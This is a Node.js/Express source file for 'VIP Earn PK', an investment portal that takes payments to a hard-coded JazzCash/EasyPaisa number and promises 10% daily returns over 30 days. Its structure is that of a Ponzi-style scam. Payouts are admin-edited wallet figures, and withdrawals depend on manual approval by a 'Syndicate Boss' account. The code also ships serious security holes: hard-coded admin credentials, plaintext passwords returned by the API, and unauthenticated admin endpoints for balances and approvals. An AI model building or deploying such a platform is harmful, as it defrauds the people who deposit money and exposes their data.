const express = require('express');
const app = express();
app.use(express.json());

// In-Memory Database
const db = {
  users: [],
  plans: [
    { id: 1, name: 'VIP 1 - Starter Elite', price: 500, daily: 50, days: 30 },
    { id: 2, name: 'VIP 2 - Bronze Venture', price: 1500, daily: 150, days: 30 },
    { id: 3, name: 'VIP 3 - Silver Capital', price: 3000, daily: 300, days: 30 },
    { id: 4, name: 'VIP 4 - Gold Tycoon', price: 6000, daily: 600, days: 30 },
    { id: 5, name: 'VIP 5 - Platinum Empire', price: 15000, daily: 1500, days: 30 },
    { id: 6, name: 'VIP 6 - Diamond Syndicate', price: 50000, daily: 5000, days: 30 }
  ],
  deposits: [],
  withdrawals: []
};

const ADMIN_PHONE = '03256098796';
const ADMIN_PASS = 'admin123';
const COMPANY_ACCOUNT = '03256098796 (JazzCash / EasyPaisa)';

app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>VIP Earn PK - Millionaire Investment Hub</title>
      <script src="https://cdn.tailwindcss.com"></script>
      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
      <style>
        @keyframes glow {
          0%, 100% { opacity: 0.4; }
          50% { opacity: 0.8; }
        }
        .animate-glow { animation: glow 4s ease-in-out infinite; }
        .glass-card {
          background: rgba(15, 23, 42, 0.85);
          backdrop-filter: blur(16px);
          border: 1px solid rgba(234, 179, 8, 0.25);
        }
      </style>
    </head>
    <body class="bg-black text-slate-100 font-sans min-h-screen flex flex-col justify-between relative overflow-x-hidden">
      
      <!-- Background Luxury Glow Elements -->
      <div class="absolute top-0 left-1/4 w-96 h-96 bg-amber-600/10 rounded-full blur-3xl pointer-events-none animate-glow"></div>
      <div class="absolute bottom-10 right-1/4 w-96 h-96 bg-yellow-500/10 rounded-full blur-3xl pointer-events-none animate-glow"></div>

      <div id="app" class="max-w-md mx-auto w-full p-4 flex-grow z-10"></div>
      
      <!-- WhatsApp Support Floating Button -->
      <a href="https://wa.me/923256098796" target="_blank" class="fixed bottom-5 right-5 bg-gradient-to-r from-emerald-600 to-teal-500 hover:from-emerald-500 hover:to-teal-400 text-white px-4 py-3 rounded-full shadow-2xl flex items-center gap-2 text-sm font-bold z-50 transition transform hover:scale-110 border border-emerald-400/30">
        <i class="fab fa-whatsapp text-xl"></i> VIP Support
      </a>

      <script>
        let currentUser = null;

        async function api(url, data) {
          const res = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
          });
          return res.json();
        }

        function renderLogin() {
          document.getElementById('app').innerHTML = \`
            <div class="flex items-center justify-center min-h-[85vh]">
              <div class="glass-card p-8 rounded-3xl shadow-2xl w-full relative overflow-hidden">
                <div class="absolute top-0 right-0 w-32 h-32 bg-amber-400/10 rounded-full blur-2xl"></div>
                
                <div class="text-center mb-8">
                  <div class="inline-flex p-4 bg-gradient-to-tr from-amber-500/20 to-yellow-300/30 text-amber-400 rounded-2xl text-4xl mb-4 shadow-inner border border-amber-500/30">
                    <i class="fas fa-crown"></i>
                  </div>
                  <h1 class="text-3xl font-black tracking-wider text-transparent bg-clip-text bg-gradient-to-r from-amber-300 via-yellow-400 to-amber-200">VIP EARN PK</h1>
                  <p class="text-xs text-amber-400/70 mt-1 uppercase tracking-widest font-semibold">Exclusive Wealth Portal</p>
                </div>
                
                <form onsubmit="handleLogin(event)" class="space-y-5">
                  <div>
                    <label class="block text-xs uppercase text-slate-400 font-bold mb-1.5 tracking-wider">Mobile Number</label>
                    <div class="relative">
                      <span class="absolute inset-y-0 left-0 pl-4 flex items-center text-amber-500/70"><i class="fas fa-mobile-alt"></i></span>
                      <input type="text" id="phone" required placeholder="03001234567" class="w-full bg-slate-950/80 border border-slate-800 rounded-xl px-4 py-3.5 pl-11 text-white focus:outline-none focus:border-amber-400 transition shadow-inner">
                    </div>
                  </div>
                  <div>
                    <label class="block text-xs uppercase text-slate-400 font-bold mb-1.5 tracking-wider">Security Password</label>
                    <div class="relative">
                      <span class="absolute inset-y-0 left-0 pl-4 flex items-center text-amber-500/70"><i class="fas fa-shield-alt"></i></span>
                      <input type="password" id="pass" required placeholder="••••••••" class="w-full bg-slate-950/80 border border-slate-800 rounded-xl px-4 py-3.5 pl-11 text-white focus:outline-none focus:border-amber-400 transition shadow-inner">
                    </div>
                  </div>
                  <button type="submit" class="w-full bg-gradient-to-r from-amber-400 via-yellow-400 to-amber-500 text-slate-950 font-black py-4 rounded-xl shadow-lg hover:brightness-110 transition transform active:scale-95 tracking-wide text-sm uppercase">
                    Access Dashboard <i class="fas fa-arrow-right ml-1"></i>
                  </button>
                </form>
                
                <div class="text-center mt-6">
                  <button onclick="renderRegister()" class="text-amber-400 text-sm hover:text-amber-300 font-semibold tracking-wide transition">New Elite Member? <span class="underline">Create Account</span></button>
                </div>
              </div>
            </div>
          \`;
        }

        function renderRegister() {
          document.getElementById('app').innerHTML = \`
            <div class="flex items-center justify-center min-h-[85vh]">
              <div class="glass-card p-8 rounded-3xl shadow-2xl w-full">
                <div class="text-center mb-8">
                  <div class="inline-flex p-3 bg-amber-500/20 text-amber-400 rounded-2xl text-3xl mb-3 border border-amber-500/30">
                    <i class="fas fa-user-plus"></i>
                  </div>
                  <h1 class="text-2xl font-black text-amber-400 tracking-wider">Join Elite Circle</h1>
                  <p class="text-xs text-slate-400 mt-1 uppercase tracking-widest">Start Your Millionaire Journey</p>
                </div>
                <form onsubmit="handleRegister(event)" class="space-y-4">
                  <div>
                    <label class="block text-xs uppercase text-slate-400 font-bold mb-1">Full Name</label>
                    <input type="text" id="name" required placeholder="Muhammad Ali" class="w-full bg-slate-950/80 border border-slate-800 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-amber-400">
                  </div>
                  <div>
                    <label class="block text-xs uppercase text-slate-400 font-bold mb-1">Mobile Number</label>
                    <input type="text" id="phone" required placeholder="03001234567" class="w-full bg-slate-950/80 border border-slate-800 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-amber-400">
                  </div>
                  <div>
                    <label class="block text-xs uppercase text-slate-400 font-bold mb-1">Password</label>
                    <input type="password" id="pass" required placeholder="••••••••" class="w-full bg-slate-950/80 border border-slate-800 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-amber-400">
                  </div>
                  <button type="submit" class="w-full bg-gradient-to-r from-amber-400 to-yellow-500 text-slate-950 font-black py-3.5 rounded-xl hover:brightness-110 transition uppercase tracking-wide shadow-lg">Register Account</button>
                </form>
                <div class="text-center mt-5">
                  <button onclick="renderLogin()" class="text-slate-400 text-sm hover:text-amber-400 transition">Already a member? <span class="text-amber-400 underline font-semibold">Login</span></button>
                </div>
              </div>
            </div>
          \`;
        }

        async function handleLogin(e) {
          e.preventDefault();
          const res = await api('/api/login', { phone: document.getElementById('phone').value, pass: document.getElementById('pass').value });
          if(res.ok) {
            currentUser = res.user;
            if(currentUser.isAdmin) renderAdmin();
            else renderDashboard();
          } else {
            alert(res.msg);
          }
        }

        async function handleRegister(e) {
          e.preventDefault();
          const res = await api('/api/register', { name: document.getElementById('name').value, phone: document.getElementById('phone').value, pass: document.getElementById('pass').value });
          if(res.ok) {
            alert('Elite account created successfully! Please login.');
            renderLogin();
          } else {
            alert(res.msg);
          }
        }

        async function renderDashboard() {
          const res = await api('/api/user', { id: currentUser.id });
          currentUser = res.user;
          const plans = res.plans;

          document.getElementById('app').innerHTML = \`
            <div class="py-6 space-y-6">
              <div class="flex justify-between items-center glass-card p-4 rounded-2xl shadow-xl">
                <div>
                  <span class="text-[10px] uppercase tracking-widest bg-amber-500/20 text-amber-400 px-2 py-0.5 rounded font-black">VIP Member</span>
                  <h2 class="text-lg font-black text-white mt-1">\${currentUser.name}</h2>
                  <p class="text-xs text-slate-400">\${currentUser.phone}</p>
                </div>
                <button onclick="logout()" class="bg-red-500/10 text-red-400 border border-red-500/30 px-3.5 py-2 rounded-xl text-xs font-bold hover:bg-red-500 hover:text-white transition">Logout</button>
              </div>

              <div class="bg-gradient-to-br from-amber-500 via-yellow-400 to-amber-600 p-6 rounded-3xl shadow-2xl text-slate-950 relative overflow-hidden">
                <div class="absolute -right-6 -bottom-6 text-slate-950/10 text-9xl font-black pointer-events-none"><i class="fas fa-wallet"></i></div>
                <p class="text-xs uppercase font-black tracking-widest opacity-80">Total Wealth Portfolio</p>
                <h1 class="text-4xl font-black mt-1">Rs. \${currentUser.balance.toLocaleString()}</h1>
                <div class="mt-5 flex gap-3">
                  <button onclick="claimDaily()" class="flex-1 bg-slate-950 text-amber-400 font-extrabold py-3 px-3 rounded-xl text-xs shadow-xl hover:bg-slate-900 transition flex items-center justify-center gap-1.5 border border-amber-400/40">
                    <i class="fas fa-bolt text-amber-400"></i> Claim ROI
                  </button>
                  <button onclick="renderDepositModal()" class="flex-1 bg-emerald-600 text-white font-extrabold py-3 px-3 rounded-xl text-xs shadow-xl hover:bg-emerald-500 transition flex items-center justify-center gap-1.5">
                    <i class="fas fa-plus-circle"></i> Deposit
                  </button>
                  <button onclick="renderWithdrawModal()" class="flex-1 bg-slate-950 text-rose-400 font-extrabold py-3 px-3 rounded-xl text-xs shadow-xl hover:bg-slate-900 transition flex items-center justify-center gap-1.5 border border-rose-500/30">
                    <i class="fas fa-arrow-alt-circle-down"></i> Withdraw
                  </button>
                </div>
              </div>

              \${currentUser.activePlan ? \`
                <div class="glass-card p-5 rounded-2xl border-emerald-500/40 shadow-xl relative overflow-hidden">
                  <div class="absolute top-0 right-0 bg-emerald-500 text-slate-950 text-[10px] font-black uppercase px-3 py-1 rounded-bl-xl">Active Investment</div>
                  <h3 class="font-black text-lg text-white">\${currentUser.activePlan.name}</h3>
                  <p class="text-xs text-emerald-400 mt-1 font-bold"><i class="fas fa-check-circle"></i> Daily Earning: Rs. \${currentUser.activePlan.daily} / day</p>
                </div>
              \` : ''}

              <div>
                <h3 class="text-md font-black mb-4 text-amber-400 uppercase tracking-wider flex items-center gap-2"><i class="fas fa-gem"></i> Elite Investment Tiers</h3>
                <div class="grid grid-cols-1 gap-3.5">
                  \${plans.map(p => \`
                    <div class="glass-card p-4.5 rounded-2xl flex justify-between items-center transition hover:border-amber-400/60 shadow-lg">
                      <div>
                        <h4 class="font-black text-amber-300 text-base">\${p.name}</h4>
                        <p class="text-xs text-slate-300 mt-0.5">Price: <span class="font-bold text-white">Rs. \${p.price}</span> | Daily Return: <span class="text-emerald-400 font-black">Rs. \${p.daily}</span></p>
                      </div>
                      <button onclick="buyPlan(\${p.id})" class="bg-gradient-to-r from-amber-400 to-yellow-400 hover:brightness-110 text-slate-950 font-black px-4 py-2.5 rounded-xl text-xs uppercase tracking-wider shadow-md transition">Invest</button>
                    </div>
                  \`).join('')}
                </div>
              </div>
            </div>
          \`;
        }

        function renderDepositModal() {
          document.getElementById('app').innerHTML = \`
            <div class="py-6">
              <div class="glass-card p-6 rounded-3xl shadow-2xl relative">
                <div class="flex justify-between items-center mb-6">
                  <h2 class="text-lg font-black text-amber-400"><i class="fas fa-university"></i> Fund Deposit</h2>
                  <button onclick="renderDashboard()" class="text-slate-400 hover:text-white font-bold text-sm"><i class="fas fa-times text-lg"></i></button>
                </div>
                <div class="bg-slate-950 p-4 rounded-2xl border border-amber-500/30 mb-5">
                  <p class="text-xs text-slate-400 uppercase font-semibold">Send money to our official account:</p>
                  <p class="text-lg font-black text-amber-300 mt-1 font-mono">${COMPANY_ACCOUNT}</p>
                  <p class="text-[11px] text-slate-500 mt-1">After payment, enter your Transaction ID (TID) below.</p>
                </div>
                <form onsubmit="submitDeposit(event)" class="space-y-4">
                  <div>
                    <label class="block text-xs uppercase text-slate-400 font-bold mb-1">Select Plan to Buy</label>
                    <select id="depPlan" class="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-3 text-white text-xs focus:outline-none focus:border-amber-400">
                      <option value="0">Add Balance Only (General Deposit)</option>
                      <option value="1">VIP 1 - Starter Elite (Rs. 500)</option>
                      <option value="2">VIP 2 - Bronze Venture (Rs. 1500)</option>
                      <option value="3">VIP 3 - Silver Capital (Rs. 3000)</option>
                      <option value="4">VIP 4 - Gold Tycoon (Rs. 6000)</option>
                      <option value="5">VIP 5 - Platinum Empire (Rs. 15000)</option>
                      <option value="6">VIP 6 - Diamond Syndicate (Rs. 50000)</option>
                    </select>
                  </div>
                  <div>
                    <label class="block text-xs uppercase text-slate-400 font-bold mb-1">Transaction ID (TID)</label>
                    <input type="text" id="depTid" required placeholder="e.g. 8392019283" class="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-3 text-white text-xs focus:outline-none focus:border-amber-400">
                  </div>
                  <button type="submit" class="w-full bg-emerald-500 hover:bg-emerald-400 text-slate-950 font-black py-3.5 rounded-xl uppercase tracking-wider text-xs shadow-lg transition">Submit Deposit Slip</button>
                </form>
              </div>
            </div>
          \`;
        }

        function renderWithdrawModal() {
          document.getElementById('app').innerHTML = \`
            <div class="py-6">
              <div class="glass-card p-6 rounded-3xl shadow-2xl relative">
                <div class="flex justify-between items-center mb-6">
                  <h2 class="text-lg font-black text-rose-400"><i class="fas fa-wallet"></i> Request Withdrawal</h2>
                  <button onclick="renderDashboard()" class="text-slate-400 hover:text-white font-bold text-sm"><i class="fas fa-times text-lg"></i></button>
                </div>
                <form onsubmit="submitWithdraw(event)" class="space-y-4">
                  <div>
                    <label class="block text-xs uppercase text-slate-400 font-bold mb-1">Withdrawal Method</label>
                    <select id="wMethod" class="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-3 text-white text-xs focus:outline-none focus:border-rose-400">
                      <option value="JazzCash">JazzCash</option>
                      <option value="EasyPaisa">EasyPaisa</option>
                    </select>
                  </div>
                  <div>
                    <label class="block text-xs uppercase text-slate-400 font-bold mb-1">Account Number</label>
                    <input type="text" id="wAcc" required placeholder="03001234567" class="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-3 text-white text-xs focus:outline-none focus:border-rose-400">
                  </div>
                  <div>
                    <label class="block text-xs uppercase text-slate-400 font-bold mb-1">Amount (Rs.)</label>
                    <input type="number" id="wAmount" required placeholder="1000" class="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-3 text-white text-xs focus:outline-none focus:border-rose-400">
                  </div>
                  <button type="submit" class="w-full bg-rose-500 hover:bg-rose-400 text-white font-black py-3.5 rounded-xl uppercase tracking-wider text-xs shadow-lg transition">Submit Withdrawal Request</button>
                </form>
              </div>
            </div>
          \`;
        }

        async function buyPlan(planId) {
          const tid = document.getElementById('depTid') ? document.getElementById('depTid').value : prompt('Send funds to JazzCash/EasyPaisa: ' + COMPANY_ACCOUNT + ' and enter TID:');
          if(!tid) {
            renderDepositModal();
            return;
          }
          const res = await api('/api/deposit', { userId: currentUser.id, planId, tid, method: 'JazzCash' });
          alert(res.msg);
          renderDashboard();
        }

        async function submitDeposit(e) {
          e.preventDefault();
          const planId = Number(document.getElementById('depPlan').value);
          const tid = document.getElementById('depTid').value;
          const res = await api('/api/deposit', { userId: currentUser.id, planId, tid, method: 'JazzCash' });
          alert(res.msg);
          renderDashboard();
        }

        async function submitWithdraw(e) {
          e.preventDefault();
          const method = document.getElementById('wMethod').value;
          const account = document.getElementById('wAcc').value;
          const amount = Number(document.getElementById('wAmount').value);
          const res = await api('/api/withdraw', { userId: currentUser.id, method, account, amount });
          alert(res.msg);
          renderDashboard();
        }

        async function claimDaily() {
          const res = await api('/api/claim', { userId: currentUser.id });
          alert(res.msg);
          renderDashboard();
        }

        async function renderAdmin() {
          const res = await api('/api/admin/data', {});
          document.getElementById('app').innerHTML = \`
            <div class="py-6 space-y-6">
              <div class="flex justify-between items-center glass-card border-amber-500/40 p-5 rounded-2xl shadow-xl">
                <div>
                  <span class="text-[10px] uppercase font-black bg-amber-500 text-slate-950 px-2 py-0.5 rounded">Master Admin</span>
                  <h2 class="text-lg font-black text-amber-400 mt-1">Control Syndicate</h2>
                  <p class="text-xs text-slate-400">\${currentUser.phone}</p>
                </div>
                <button onclick="logout()" class="bg-red-500/20 text-red-400 border border-red-500/30 px-3 py-1.5 rounded-xl text-xs font-bold">Logout</button>
              </div>

              <!-- Deposits Section -->
              <div class="glass-card p-5 rounded-2xl shadow-xl">
                <h3 class="text-sm font-black text-amber-400 mb-3 uppercase tracking-wider"><i class="fas fa-clock"></i> Pending Deposit TIDs</h3>
                <div class="space-y-3">
                  \${res.deposits.length === 0 ? '<p class="text-xs text-slate-500 italic">No pending deposits.</p>' : ''}
                  \${res.deposits.map(d => \`
                    <div class="bg-slate-950/90 p-3.5 rounded-xl border border-slate-800 flex justify-between items-center text-xs">
                      <div>
                        <p class="font-bold text-white">User ID: \${d.userId} | <span class="text-amber-400">\${d.planName}</span></p>
                        <p class="text-slate-300 mt-1">TID: <span class="font-mono text-yellow-300 font-bold">\${d.tid}</span> (Rs. \${d.amount})</p>
                      </div>
                      <div class="flex gap-2">
                        <button onclick="approveDeposit(\${d.id}, 'Approved')" class="bg-emerald-500 hover:bg-emerald-400 text-slate-950 px-3 py-1.5 rounded-lg font-black">Approve</button>
                        <button onclick="approveDeposit(\${d.id}, 'Rejected')" class="bg-rose-500 hover:bg-rose-400 text-white px-3 py-1.5 rounded-lg font-black">Reject</button>
                      </div>
                    </div>
                  \`).join('')}
                </div>
              </div>

              <!-- Withdrawals Section -->
              <div class="glass-card p-5 rounded-2xl shadow-xl">
                <h3 class="text-sm font-black text-rose-400 mb-3 uppercase tracking-wider"><i class="fas fa-money-bill-wave"></i> Pending Withdrawals</h3>
                <div class="space-y-3">
                  \${res.withdrawals.length === 0 ? '<p class="text-xs text-slate-500 italic">No pending withdrawals.</p>' : ''}
                  \${res.withdrawals.map(w => \`
                    <div class="bg-slate-950/90 p-3.5 rounded-xl border border-slate-800 flex justify-between items-center text-xs">
                      <div>
                        <p class="font-bold text-white">User ID: \${w.userId} | <span class="text-rose-400">Rs. \${w.amount}</span></p>
                        <p class="text-slate-300 mt-1">\${w.method}: <span class="font-mono text-yellow-300 font-bold">\${w.account}</span></p>
                      </div>
                      <div class="flex gap-2">
                        <button onclick="approveWithdraw(\${w.id}, 'Approved')" class="bg-emerald-500 hover:bg-emerald-400 text-slate-950 px-3 py-1.5 rounded-lg font-black">Approve</button>
                        <button onclick="approveWithdraw(\${w.id}, 'Rejected')" class="bg-rose-500 hover:bg-rose-400 text-white px-3 py-1.5 rounded-lg font-black">Reject</button>
                      </div>
                    </div>
                  \`).join('')}
                </div>
              </div>

              <!-- Users Section -->
              <div class="glass-card p-5 rounded-2xl shadow-xl">
                <h3 class="text-sm font-black text-amber-400 mb-3 uppercase tracking-wider"><i class="fas fa-users"></i> Registered Elite Users</h3>
                <div class="space-y-3">
                  \${res.users.map(u => \`
                    <div class="bg-slate-950/90 p-3.5 rounded-xl border border-slate-800 flex justify-between items-center text-xs">
                      <div>
                        <p class="font-black text-white">\${u.name} <span class="text-slate-400 font-normal">(\${u.phone})</span></p>
                        <p class="text-amber-400 font-bold mt-0.5">Balance: Rs. \${u.balance.toLocaleString()}</p>
                      </div>
                      <button onclick="editBalance(\${u.id})" class="bg-amber-400 hover:bg-amber-300 text-slate-950 px-3 py-1.5 rounded-lg font-black">Edit Balance</button>
                    </div>
                  \`).join('')}
                </div>
              </div>
            </div>
          \`;
        }

        async function approveDeposit(id, status) {
          await api('/api/admin/deposit', { id, status });
          renderAdmin();
        }

        async function approveWithdraw(id, status) {
          await api('/api/admin/withdraw', { id, status });
          renderAdmin();
        }

        async function editBalance(userId) {
          const newBal = prompt('Enter new millionaire balance amount:');
          if(newBal === null) return;
          await api('/api/admin/bal', { userId, balance: Number(newBal) });
          renderAdmin();
        }

        function logout() {
          currentUser = null;
          renderLogin();
        }

        renderLogin();
      </script>
    </body>
    </html>
  `);
});

app.post('/api/register', (req, res) => {
  const { name, phone, pass } = req.body;
  if(db.users.find(u => u.phone === phone)) {
    return res.send({ ok: false, msg: 'Phone number already registered!' });
  }
  const user = { id: db.users.length + 1, name, phone, pass, balance: 0, activePlan: null, lastClaim: null, isAdmin: false };
  db.users.push(user);
  res.send({ ok: true });
});

app.post('/api/login', (req, res) => {
  const { phone, pass } = req.body;
  if(phone === ADMIN_PHONE && pass === ADMIN_PASS) {
    return res.send({ ok: true, user: { id: 999, name: 'Syndicate Boss', phone: ADMIN_PHONE, isAdmin: true } });
  }
  const user = db.users.find(u => u.phone === phone && u.pass === pass);
  if(!user) return res.send({ ok: false, msg: 'Invalid credentials!' });
  res.send({ ok: true, user });
});

app.post('/api/user', (req, res) => {
  const user = db.users.find(u => u.id === req.body.id);
  res.send({ user, plans: db.plans });
});

app.post('/api/deposit', (req, res) => {
  const { userId, planId, tid, method } = req.body;
  const p = planId > 0 ? db.plans.find(x => x.id === Number(planId)) : { name: 'General Balance Deposit', price: 0 };
  db.deposits.push({ id: db.deposits.length + 1, userId, planId: Number(planId), planName: p.name, amount: p.price || 0, tid, method, status: 'Pending' });
  res.send({ ok: true, msg: 'Deposit submission successful! Pending Admin validation.' });
});

app.post('/api/withdraw', (req, res) => {
  const { userId, method, account, amount } = req.body;
  const user = db.users.find(u => u.id === Number(userId));
  if (!user || user.balance < amount) {
    return res.send({ ok: false, msg: 'Insufficient balance for withdrawal!' });
  }
  db.withdrawals.push({ id: db.withdrawals.length + 1, userId: Number(userId), method, account, amount: Number(amount), status: 'Pending' });
  res.send({ ok: true, msg: 'Withdrawal request submitted successfully! Pending Admin approval.' });
});

app.post('/api/claim', (req, res) => {
  const user = db.users.find(u => u.id === req.body.userId);
  if(!user || !user.activePlan) return res.send({ ok: false, msg: 'No active investment tier found!' });
  
  const today = new Date().toDateString();
  if(user.lastClaim === today) return res.send({ ok: false, msg: 'Daily profit already claimed for today!' });

  user.balance += user.activePlan.daily;
  user.lastClaim = today;
  res.send({ ok: true, msg: 'Daily profit successfully added to wallet!' });
});

app.post('/api/admin/data', (req, res) => {
  res.send({ deposits: db.deposits.filter(d => d.status === 'Pending'), withdrawals: db.withdrawals.filter(w => w.status === 'Pending'), users: db.users });
});

app.post('/api/admin/deposit', (req, res) => {
  const { id, status } = req.body;
  const d = db.deposits.find(x => x.id === Number(id));
  if(d && d.status === 'Pending') {
    d.status = status;
    if(status === 'Approved') {
      const u = db.users.find(x => x.id === d.userId);
      const p = db.plans.find(x => x.id === d.planId);
      if(u && p) u.activePlan = p;
    }
  }
  res.send({ ok: true });
});

app.post('/api/admin/withdraw', (req, res) => {
  const { id, status } = req.body;
  const w = db.withdrawals.find(x => x.id === Number(id));
  if(w && w.status === 'Pending') {
    w.status = status;
    if(status === 'Approved') {
      const u = db.users.find(x => x.id === w.userId);
      if(u && u.balance >= w.amount) {
        u.balance -= w.amount;
      }
    }
  }
  res.send({ ok: true });
});

app.post('/api/admin/bal', (req, res) => {
  const { userId, balance } = req.body;
  const u = db.users.find(x => x.id === Number(userId));
  if(u) u.balance = Number(balance);
  res.send({ ok: true });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`VIP Millionaire Portal Running on Port ${PORT}`);
});
